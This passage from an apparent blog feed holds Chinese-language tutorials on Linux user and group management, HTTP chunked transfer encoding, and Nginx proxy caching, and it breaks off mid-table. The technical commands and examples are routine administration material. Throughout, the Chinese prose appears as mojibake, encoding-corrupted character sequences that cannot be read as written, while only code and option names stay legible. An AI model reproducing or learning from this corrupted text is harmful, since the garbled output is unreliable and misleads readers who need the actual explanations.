        <content type="html"><![CDATA[<h2 id="Linux-ç”¨æˆ·å’Œç”¨æˆ·ç»„"><a href="#Linux-ç”¨æˆ·å’Œç”¨æˆ·ç»„" class="headerlink" title="Linux ç”¨æˆ·å’Œç”¨æˆ·ç»„"></a>Linux ç”¨æˆ·å’Œç”¨æˆ·ç»„</h2><p>æˆ‘ä»¬è¦è¿›å…¥<code>Linux</code>ç³»ç»Ÿé¦–å…ˆè¦è¾“å…¥æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œå…¶å®<code>Linux</code>å¹¶ä¸è®¤è¯†è¿™ä¸ªç”¨æˆ·åï¼Œå®ƒåªè®¤è¯†è¿™ä¸ªç”¨æˆ·åå¯¹åº”çš„ID - <code>UID</code>ã€‚ç”¨æˆ·åæ˜¯ç»™æˆ‘ä»¬äººç±»çœ‹çš„ï¼Œ<code>UID</code>æ‰æ˜¯ç»™æœºå™¨ç”¨çš„ã€‚é™¤äº†ç”¨æˆ·åï¼Œæˆ‘ä»¬è¿˜è¦è¾“å…¥å¯†ç ã€‚è¿™æ ·å°±èƒ½è¿›å…¥<code>Linux</code>ç³»ç»Ÿäº†ã€‚</p><p>Linuxä¸‹çš„ç”¨æˆ·å’Œç”¨æˆ·å¯†ç æ˜¯ä»¥æ–‡æœ¬å½¢å¼å­˜åˆ†åˆ«å­˜åœ¨<code>/etc/passwd</code>å’Œ<code>/etc/shadow</code>ä¸­ã€‚<code>/etc/passwd</code>é‡Œé¢å­˜çš„æ•°æ®æ˜¯ä¸€ä¸ªä¸ƒå…ƒç»„ï¼Œä»¥<code>:</code>åˆ†å‰²ã€‚</p><blockquote><p>ç”¨æˆ·å:å¯†ç :UID:GID:ç”¨æˆ·è¯´æ˜:ç”¨æˆ·ç›®å½•:ç”¨æˆ·Shell</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">head</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç¬¬äºŒåˆ—å¯†ç åˆ—å…¨éƒ¨éƒ½æ˜¯<code>x</code>ï¼Œè¿™æ˜¯é—ç•™é—®é¢˜ã€‚ç°åœ¨ç”¨æˆ·å¯†ç å·²ç»ä¸åœ¨å­˜åœ¨<code>/etc/passwd</code>æ–‡ä»¶ä¸­äº†ï¼Œè€Œæ˜¯åœ¨<code>/etc/shadow</code>é‡Œé¢ã€‚æœ€åä¸€ä¸ª<code>ç”¨æˆ·shell</code>æ˜¯ç”¨æˆ·ç™»å½•åä½¿ç”¨çš„shellï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³è®©è¿™ä¸ªç”¨æˆ·ç™»å½•å¯ä»¥æŒ‡å®šå…¶shellä¸º<code>/sbin/nologin</code>ã€‚</p><p>Linuxä¸­æ¯ä¸€ä¸ªç”¨æˆ·éƒ½ä¼šè‡³å°‘å±äºä¸€ä¸ªç”¨æˆ·ç»„ï¼Œè¿™ä¸ªç”¨æˆ·ç»„å¯ä»¥ç”¨æ¥æ ‡è¯†ä¸€æ‰¹ç”¨æˆ·çš„å…³ç³»ã€‚åœ¨æ–‡ä»¶æƒé™ç®¡ç†ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ç»„æƒé™æ¥å®ç°åŒä¸€ä¸ªç»„ä¸‹é¢çš„ç”¨æˆ·å¯¹æ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚åŒæ ·ï¼Œç”¨æˆ·ç»„çš„åå­—æ˜¯ç»™æˆ‘ä»¬äººç±»çœ‹çš„ï¼Œç”¨æˆ·ç»„æœ‰ä¸€ä¸ªID - <code>GID</code>ã€‚ç”¨æˆ·ç»„ä¿¡æ¯å­˜æ”¾åœ¨<code>/etc/group</code>æ–‡ä»¶ä¸­ï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ªå¾ˆå°‘ç”¨çš„ç”¨æˆ·ç»„å¯†ç ï¼Œå®ƒå­˜æ”¾åœ¨<code>/etc/gshadow</code>æ–‡ä»¶ä¸­ã€‚<code>/etc/group</code>å­˜æ”¾çš„æ•°æ®æ˜¯ä¸€ä¸ªå››å…ƒç»„ã€‚</p><blockquote><p>ç¾¤ç»„å:ç¾¤ç»„å¯†ç :GID:ç¾¤ç»„ä¸‹çš„ç”¨æˆ·</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ head /etc/group</span><br><span class="line">root:x:0:</span><br><span class="line">bin:x:1:bin,daemon</span><br><span class="line">daemon:x:2:bin,daemon</span><br><span class="line">sys:x:3:bin,adm</span><br><span class="line">adm:x:4:adm,daemon</span><br><span class="line">tty:x:5:</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:daemon</span><br><span class="line">mem:x:8:</span><br><span class="line">kmem:x:9:</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç»„å¯†ç åŒæ ·æ˜¯<code>x</code>ï¼Œå®ƒå­˜æ”¾åœ¨<code>/etc/gshadow</code>ä¸­ã€‚</p><h3 id="ç”¨æˆ·ç»„"><a href="#ç”¨æˆ·ç»„" class="headerlink" title="ç”¨æˆ·ç»„"></a>ç”¨æˆ·ç»„</h3><h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><ul><li><p>groupadd [-g] gid [-r] groupname<br>  -g  å¾Œé¢æ¥æŸå€‹ç‰¹å®šçš„ GID ï¼Œç”¨ä¾†ç›´æ¥çµ¦äºˆæŸå€‹ GID<br>  -r  å»ºç«‹ç³»çµ±ç¾¤çµ„å•¦ï¼èˆ‡ &#x2F;etc&#x2F;login.defs å…§çš„ GID_MIN æœ‰é—œã€‚   </p></li><li><p>groupmod [-g gid] [-n group_name] ç¾¤çµ„å<br>  -g  ä¿®æ”¹æ—¢æœ‰çš„ GID æ•¸å­—<br>  -n  ä¿®æ”¹æ—¢æœ‰çš„ç¾¤çµ„åç¨±</p></li><li><p>groupdel [groupname]</p></li></ul><h3 id="ç”¨æˆ·"><a href="#ç”¨æˆ·" class="headerlink" title="ç”¨æˆ·"></a>ç”¨æˆ·</h3><ul><li><p>useradd [-u UID] [-g åˆå§‹ç¾¤çµ„] [-G æ¬¡è¦ç¾¤çµ„] [-mM]\</p><blockquote><p> [-c èªªæ˜æ¬„] [-d å®¶ç›®éŒ„çµ•å°è·¯å¾‘] [-s shell] ä½¿ç”¨è€…å¸³è™Ÿå</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">\-u  ï¼šå¾Œé¢æ¥çš„æ˜¯ UID ï¼Œæ˜¯ä¸€çµ„æ•¸å­—ã€‚ç›´æ¥æŒ‡å®šä¸€å€‹ç‰¹å®šçš„ UID çµ¦é€™å€‹å¸³è™Ÿï¼›</span><br><span class="line">\-g  ï¼šå¾Œé¢æ¥çš„é‚£å€‹ç¾¤çµ„åç¨±å°±æ˜¯æˆ‘å€‘ä¸Šé¢æåˆ°çš„ initial group å•¦ï½</span><br><span class="line">    è©²ç¾¤çµ„çš„ GID æœƒè¢«æ”¾ç½®åˆ° /etc/passwd çš„ç¬¬å››å€‹æ¬„ä½å…§ã€‚</span><br><span class="line">\-G  ï¼šå¾Œé¢æ¥çš„ç¾¤çµ„åç¨±å‰‡æ˜¯é€™å€‹å¸³è™Ÿé‚„å¯ä»¥åŠ å…¥çš„ç¾¤çµ„ã€‚</span><br><span class="line">    é€™å€‹é¸é …èˆ‡åƒæ•¸æœƒä¿®æ”¹ /etc/group å…§çš„ç›¸é—œè³‡æ–™å–”ï¼</span><br><span class="line">\-M  ï¼šå¼·åˆ¶ï¼ä¸è¦å»ºç«‹ä½¿ç”¨è€…å®¶ç›®éŒ„ï¼(ç³»çµ±å¸³è™Ÿé è¨­å€¼)</span><br><span class="line">\-m  ï¼šå¼·åˆ¶ï¼è¦å»ºç«‹ä½¿ç”¨è€…å®¶ç›®éŒ„ï¼(ä¸€èˆ¬å¸³è™Ÿé è¨­å€¼)</span><br><span class="line">\-c  ï¼šé€™å€‹å°±æ˜¯ /etc/passwd çš„ç¬¬äº”æ¬„çš„èªªæ˜å…§å®¹å•¦ï½å¯ä»¥éš¨ä¾¿æˆ‘å€‘è¨­å®šçš„å•¦ï½</span><br><span class="line">\-d  ï¼šæŒ‡å®šæŸå€‹ç›®éŒ„æˆç‚ºå®¶ç›®éŒ„ï¼Œè€Œä¸è¦ä½¿ç”¨é è¨­å€¼ã€‚å‹™å¿…ä½¿ç”¨çµ•å°è·¯å¾‘ï¼</span><br><span class="line">\-r  ï¼šå»ºç«‹ä¸€å€‹ç³»çµ±çš„å¸³è™Ÿï¼Œé€™å€‹å¸³è™Ÿçš„ UID æœƒæœ‰é™åˆ¶ (åƒè€ƒ /etc/login.defs)</span><br><span class="line">\-s  ï¼šå¾Œé¢æ¥ä¸€å€‹ shell ï¼Œè‹¥æ²’æœ‰æŒ‡å®šå‰‡é è¨­æ˜¯ /bin/bash çš„å•¦ï½</span><br><span class="line">\-e  ï¼šå¾Œé¢æ¥ä¸€å€‹æ—¥æœŸï¼Œæ ¼å¼ç‚ºã€YYYY-MM-DDã€æ­¤é …ç›®å¯å¯«å…¥ shadow ç¬¬å…«æ¬„ä½ï¼Œ</span><br><span class="line">    äº¦å³å¸³è™Ÿå¤±æ•ˆæ—¥çš„è¨­å®šé …ç›®å›‰ï¼›</span><br><span class="line">\-f  ï¼šå¾Œé¢æ¥ shadow çš„ç¬¬ä¸ƒæ¬„ä½é …ç›®ï¼ŒæŒ‡å®šå¯†ç¢¼æ˜¯å¦æœƒå¤±æ•ˆã€‚0ç‚ºç«‹åˆ»å¤±æ•ˆï¼Œ</span><br><span class="line">    -1 ç‚ºæ°¸é ä¸å¤±æ•ˆ(å¯†ç¢¼åªæœƒéæœŸè€Œå¼·åˆ¶æ–¼ç™»å…¥æ™‚é‡æ–°è¨­å®šè€Œå·²ã€‚</span><br></pre></td></tr></table></figure></blockquote></li><li><p>usermod [-cdegGlsuLU] username </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\-c  å¾Œé¢æ¥å¸³è™Ÿçš„èªªæ˜ï¼Œå³ /etc/passwd ç¬¬äº”æ¬„çš„èªªæ˜æ¬„ï¼Œå¯ä»¥åŠ å…¥ä¸€äº›å¸³è™Ÿçš„èªªæ˜ã€‚</span><br><span class="line">\-d  å¾Œé¢æ¥å¸³è™Ÿçš„å®¶ç›®éŒ„ï¼Œå³ä¿®æ”¹ /etc/passwd çš„ç¬¬å…­æ¬„ï¼›</span><br><span class="line">\-e  å¾Œé¢æ¥æ—¥æœŸï¼Œæ ¼å¼æ˜¯ YYYY-MM-DD ä¹Ÿå°±æ˜¯åœ¨ /etc/shadow å…§çš„ç¬¬å…«å€‹æ¬„ä½è³‡æ–™å•¦ï¼</span><br><span class="line">\-f  å¾Œé¢æ¥å¤©æ•¸ï¼Œç‚º shadow çš„ç¬¬ä¸ƒæ¬„ä½ã€‚</span><br><span class="line">\-g  å¾Œé¢æ¥åˆå§‹ç¾¤çµ„ï¼Œä¿®æ”¹ /etc/passwd çš„ç¬¬å››å€‹æ¬„ä½ï¼Œäº¦å³æ˜¯ GID çš„æ¬„ä½ï¼</span><br><span class="line">\-G  å¾Œé¢æ¥æ¬¡è¦ç¾¤çµ„ï¼Œä¿®æ”¹é€™å€‹ä½¿ç”¨è€…èƒ½å¤ æ”¯æ´çš„ç¾¤çµ„ï¼Œä¿®æ”¹çš„æ˜¯ /etc/group å›‰ï½</span><br><span class="line">\-a  èˆ‡ -G åˆç”¨ï¼Œå¯ã€å¢åŠ æ¬¡è¦ç¾¤çµ„çš„æ”¯æ´ã€è€Œéã€è¨­å®šã€å–”ï¼</span><br><span class="line">\-l  å¾Œé¢æ¥å¸³è™Ÿåç¨±ã€‚äº¦å³æ˜¯ä¿®æ”¹å¸³è™Ÿåç¨±ï¼Œ /etc/passwd çš„ç¬¬ä¸€æ¬„ï¼</span><br><span class="line">\-s  å¾Œé¢æ¥ Shell çš„å¯¦éš›æª”æ¡ˆï¼Œä¾‹å¦‚ /bin/bash æˆ– /bin/csh ç­‰ç­‰ã€‚</span><br><span class="line">\-u  å¾Œé¢æ¥ UID æ•¸å­—å•¦ï¼å³ /etc/passwd ç¬¬ä¸‰æ¬„çš„è³‡æ–™ï¼›</span><br><span class="line">\-L  æš«æ™‚å°‡ä½¿ç”¨è€…çš„å¯†ç¢¼å‡çµï¼Œè®“ä»–ç„¡æ³•ç™»å…¥ã€‚å…¶å¯¦åƒ…æ”¹ /etc/shadow çš„å¯†ç¢¼æ¬„ã€‚</span><br><span class="line">\-U  å°‡ /etc/shadow å¯†ç¢¼æ¬„çš„ ! æ‹¿æ‰ï¼Œè§£å‡å•¦</span><br></pre></td></tr></table></figure></li><li><p>userdel [-r] username</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r  ï¼šé€£åŒä½¿ç”¨è€…çš„å®¶ç›®éŒ„ä¹Ÿä¸€èµ·åˆªé™¤</span><br></pre></td></tr></table></figure></li><li><p>passwd [-l] [-u] [â€“stdin] [-S] \</p><blockquote><p> [-n æ—¥æ•¸] [-x æ—¥æ•¸] [-w æ—¥æ•¸] [-i æ—¥æ•¸] å¸³è™Ÿ &lt;&#x3D;&#x3D;root åŠŸèƒ½</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\--stdin ï¼šå¯ä»¥é€éä¾†è‡ªå‰ä¸€å€‹ç®¡ç·šçš„è³‡æ–™ï¼Œä½œç‚ºå¯†ç¢¼è¼¸å…¥ï¼Œå° shell script æœ‰å¹«åŠ©ï¼</span><br><span class="line">\-l  ï¼šæ˜¯ Lock çš„æ„æ€ï¼Œæœƒå°‡ /etc/shadow ç¬¬äºŒæ¬„æœ€å‰é¢åŠ ä¸Š ! ä½¿å¯†ç¢¼å¤±æ•ˆï¼›</span><br><span class="line">\-u  ï¼šèˆ‡ -l ç›¸å°ï¼Œæ˜¯ Unlock çš„æ„æ€ï¼</span><br><span class="line">\-S  ï¼šåˆ—å‡ºå¯†ç¢¼ç›¸é—œåƒæ•¸ï¼Œäº¦å³ shadow æª”æ¡ˆå…§çš„å¤§éƒ¨åˆ†è³‡è¨Šã€‚</span><br><span class="line">\-n  ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œshadow çš„ç¬¬ 4 æ¬„ä½ï¼Œå¤šä¹…ä¸å¯ä¿®æ”¹å¯†ç¢¼å¤©æ•¸</span><br><span class="line">\-x  ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œshadow çš„ç¬¬ 5 æ¬„ä½ï¼Œå¤šä¹…å…§å¿…é ˆè¦æ›´å‹•å¯†ç¢¼</span><br><span class="line">\-w  ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œshadow çš„ç¬¬ 6 æ¬„ä½ï¼Œå¯†ç¢¼éæœŸå‰çš„è­¦å‘Šå¤©æ•¸</span><br><span class="line">\-i  ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œshadow çš„ç¬¬ 7 æ¬„ä½ï¼Œå¯†ç¢¼å¤±æ•ˆå¤©æ•¸</span><br></pre></td></tr></table></figure></blockquote></li><li><p>chage [-ldEImMW] å¸³è™Ÿå</p><blockquote><p>ä¸ <code>passwd -S</code> åŠŸèƒ½ç±»ä¼¼</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\-l ï¼šåˆ—å‡ºè©²å¸³è™Ÿçš„è©³ç´°å¯†ç¢¼åƒæ•¸ï¼›</span><br><span class="line">\-d ï¼šå¾Œé¢æ¥æ—¥æœŸï¼Œä¿®æ”¹ shadow ç¬¬ä¸‰æ¬„ä½(æœ€è¿‘ä¸€æ¬¡æ›´æ”¹å¯†ç¢¼çš„æ—¥æœŸ)ï¼Œæ ¼å¼ YYYY-MM-DD</span><br><span class="line">\-E ï¼šå¾Œé¢æ¥æ—¥æœŸï¼Œä¿®æ”¹ shadow ç¬¬å…«æ¬„ä½(å¸³è™Ÿå¤±æ•ˆæ—¥)ï¼Œæ ¼å¼ YYYY-MM-DD</span><br><span class="line">\-I ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œä¿®æ”¹ shadow ç¬¬ä¸ƒæ¬„ä½(å¯†ç¢¼å¤±æ•ˆæ—¥æœŸ)</span><br><span class="line">\-m ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œä¿®æ”¹ shadow ç¬¬å››æ¬„ä½(å¯†ç¢¼æœ€çŸ­ä¿ç•™å¤©æ•¸)</span><br><span class="line">\-M ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œä¿®æ”¹ shadow ç¬¬äº”æ¬„ä½(å¯†ç¢¼å¤šä¹…éœ€è¦é€²è¡Œè®Šæ›´)</span><br><span class="line">\-W ï¼šå¾Œé¢æ¥å¤©æ•¸ï¼Œä¿®æ”¹ shadow ç¬¬å…­æ¬„ä½(å¯†ç¢¼éæœŸå‰è­¦å‘Šæ—¥æœŸ)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>groups<br>  æ˜¾ç¤ºç”¨æˆ·çš„æœ‰æ•ˆç¾¤ç»„</p></li><li><p>newgrp<br>  åˆ‡æ¢æœ‰æ•ˆç¾¤ç»„ ï¼ˆå¯ä»¥ä½¿ç”¨ usermod -G ä¸ºç”¨æˆ·æ·»åŠ æœ‰æ•ˆç¾¤ç»„ï¼‰</p></li><li><p>id [username]<br>  æŸ¥è¯¢ç”¨æˆ·çš„UIDã€GID</p></li><li><p>chsh [-ls]</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-l  ï¼šåˆ—å‡ºç›®å‰ç³»çµ±ä¸Šé¢å¯ç”¨çš„ shell ï¼Œå…¶å¯¦å°±æ˜¯ /etc/shells çš„å…§å®¹ï¼</span><br><span class="line">-s  ï¼šè¨­å®šä¿®æ”¹è‡ªå·±çš„ Shell å›‰</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h3><ul><li>chgrp [groupname] æ–‡ä»¶<br>  ä¿®æ”¹æ–‡ä»¶æ‰€å±ç»„</li><li>chown<br>  ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…å’Œç»„</li><li>chmod<br>  ä¿®æ”¹æ–‡ä»¶æƒé™</li></ul><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><p>å¯ä»¥å°†å¤šä¸ªç”¨æˆ·è®¾ç½®åŒä¸€ä¸ªç”¨æˆ·ç»„ï¼Œåœ¨æ–‡ä»¶ç»„æƒé™è®¾ç½®ç»„å¯è¯»ã€‚åŒç»„å†…çš„ç”¨æˆ·å°±å¯ä»¥å…±äº«æ–‡ä»¶ã€‚</p><blockquote><p>æ³¨æ„ï¼šå¯¹äºæ–‡ä»¶å¤¹è¦æƒ³è¯»å–å¿…é¡»è¦æœ‰æ‰§è¡Œæƒé™ã€‚</p></blockquote><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="http://linux.vbird.org/linux_basic/0410accountmanager.php">Linux å¸³è™Ÿç®¡ç†èˆ‡ ACL æ¬Šé™è¨­å®š</a>  </li><li><a href="http://www.cnblogs.com/bodhitree/p/6018369.html">Linux ä¸‹ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œç¨‹åºâ€”â€” suã€sudoã€runuser</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP åˆ†å—ä¼ è¾“ç¼–ç </title>
      <link href="/post/chunked-transfer-encoding.html"/>
      <url>/post/chunked-transfer-encoding.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTPåˆ†å—ä¼ è¾“ç¼–ç "><a href="#HTTPåˆ†å—ä¼ è¾“ç¼–ç " class="headerlink" title="HTTPåˆ†å—ä¼ è¾“ç¼–ç "></a>HTTPåˆ†å—ä¼ è¾“ç¼–ç </h2><p>HTTP åˆ†å—ä¼ è¾“ç¼–ç æ˜¯ <code>HTTP/1.1</code> ç‰ˆæœ¬æ–°å¢çš„å†…å®¹ã€‚ä¸»è¦ç”¨äºè§£å†³æˆ‘ä»¬äº‹å…ˆä¸å¤ªå¥½ç¡®å®šå†…å®¹å¤§å°çš„é—®é¢˜ï¼Œæ¯æ¬¡å¯ä»¥åªä¼ è¾“ä¸€éƒ¨åˆ†å†…å®¹ã€‚å®ƒçš„æ ¼å¼æ˜¯é¦–è¡Œä¸€ä¸ªåå…­è¿›åˆ¶çš„å—å¤§å°ï¼Œç„¶å<code>\r\n</code>å—æ­£æ–‡ã€‚å¯ä»¥ä¼ è¾“å¤šä¸ªå—ï¼Œæœ€åä¸€ä¸ªå—å¤§å°0ä»£è¡¨æ•´ä¸ªå“åº”ç»“æŸã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Content-Type: text/plain </span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">7\r\n</span><br><span class="line">Mozilla\r\n </span><br><span class="line">9\r\n</span><br><span class="line">Developer\r\n</span><br><span class="line">7\r\n</span><br><span class="line">Network\r\n</span><br><span class="line">0\r\n </span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><h3 id="å¤´ä¿¡æ¯"><a href="#å¤´ä¿¡æ¯" class="headerlink" title="å¤´ä¿¡æ¯"></a>å¤´ä¿¡æ¯</h3><ul><li><p>TE<br>ç”¨åœ¨è¯·æ±‚é¦–éƒ¨ä¸­ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å“ªäº›ä¼ è¾“ç¼–ç æ‰©å±•ã€‚å¦‚æœè¿™ä¸ªé¦–éƒ¨èµ·åå« <code>Accept-Transfer-Encoding</code>ï¼Œå®ƒçš„æ„ä¹‰å°±ä¼šæ›´ç›´ç™½ã€‚</p></li><li><p>Transfer-Encoding<br>å‘ŠçŸ¥æ¥æ”¶æ–¹ä¸ºäº†å¯é åœ°ä¼ è¾“æŠ¥æ–‡ï¼Œå·²ç»å¯¹å…¶è¿›è¡Œäº†ä½•ç§ç¼–ç ã€‚</p></li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding">Transfer-Encoding - MDN</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> transfer-encoding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginxç¼“å­˜é…ç½®</title>
      <link href="/post/nginx-proxy-cache.html"/>
      <url>/post/nginx-proxy-cache.html</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx-ç¼“å­˜"><a href="#Nginx-ç¼“å­˜" class="headerlink" title="Nginx ç¼“å­˜"></a>Nginx ç¼“å­˜</h2><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒNGINXéœ€è¦è€ƒè™‘ä»åŸå§‹æœåŠ¡å™¨å¾—åˆ°çš„Cache-Controlæ ‡å¤´ã€‚å½“åœ¨å“åº”å¤´éƒ¨ä¸­Cache-Controlè¢«é…ç½®ä¸ºPrivateï¼ŒNo-Cacheï¼ŒNo-Storeæˆ–è€…Set-Cookieï¼ŒNGINXä¸è¿›è¡Œç¼“å­˜ã€‚NGINXä»…ä»…ç¼“å­˜GETå’ŒHEADå®¢æˆ·ç«¯è¯·æ±‚ã€‚</p></blockquote><h3 id="proxy-cache-path"><a href="#proxy-cache-path" class="headerlink" title="proxy_cache_path"></a>proxy_cache_path</h3><blockquote><p>proxy_cache_pathç”¨æ¥è®¾ç½®ç¼“å­˜çš„è·¯å¾„å’Œé…ç½®</p></blockquote><p><strong>ç¤ºä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_path /usr/local/openresty/nginx/proxy_cache/ levels=1:2 keys_zone=my_cache:5m max_size=1g inactive=7d;</span><br></pre></td></tr></table></figure><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>/usr/local/openresty/nginx/proxy_cache/</code></td><td>è¡¨ç¤ºç¼“å­˜æ–‡ä»¶ç›®å½•ã€‚</td></tr><tr><td><code>levels=1:2</code></td><td>å°†å¤§é‡çš„æ–‡ä»¶æ”¾ç½®åœ¨å•ä¸ªç›®å½•ä¸­ä¼šå¯¼è‡´æ–‡ä»¶è®¿é—®ç¼“æ…¢ã€‚è¿™é‡ŒæŒ‡å®šç¼“å­˜ç©ºé—´æœ‰ä¸¤å±‚hashç›®å½•ï¼Œç¬¬ä¸€å±‚ç›®å½•ä¸º1ä¸ªå­—æ¯ï¼Œç¬¬äºŒå±‚ä¸º2ä¸ªå­—æ¯ï¼Œä¿å­˜çš„æ–‡ä»¶åä¼šç±»ä¼¼ <code>/usr/local/openresty/nginx/proxy_cache/</code><strong>c</strong><code>/</code><strong>29</strong><code>/01524fae79697630d0454ba3fabd9</code><strong>29c</strong>ã€‚</td></tr><tr><td><code>keys_zone=my_cache:5m</code></td><td>è®¾ç½®ä¸€ä¸ªå…±äº«å†…å­˜åŒºï¼Œè¯¥å†…å­˜åŒºç”¨äºå­˜å‚¨ç¼“å­˜é”®å’Œå…ƒæ•°æ®ï¼Œæœ‰äº›ç±»ä¼¼è®¡æ—¶å™¨çš„ç”¨é€”ã€‚å°†é”®çš„æ‹·è´æ”¾å…¥å†…å­˜å¯ä»¥ä½¿NGINXåœ¨ä¸æ£€ç´¢ç£ç›˜çš„æƒ…å†µä¸‹å¿«é€Ÿå†³å®šä¸€ä¸ªè¯·æ±‚æ˜¯<code>HIT</code>è¿˜æ˜¯<code>MISS</code>ï¼Œè¿™æ ·å¤§å¤§æé«˜äº†æ£€ç´¢é€Ÿåº¦ã€‚ä¸€ä¸ª1MBçš„å†…å­˜ç©ºé—´å¯ä»¥å­˜å‚¨å¤§çº¦8000ä¸ªkeyã€‚</td></tr><tr><td><code>max_size=1g</code></td><td>è®¾ç½®äº†ç¼“å­˜çš„ä¸Šé™ã€‚</td></tr><tr><td><code>inactive=7d</code></td><td>inactive 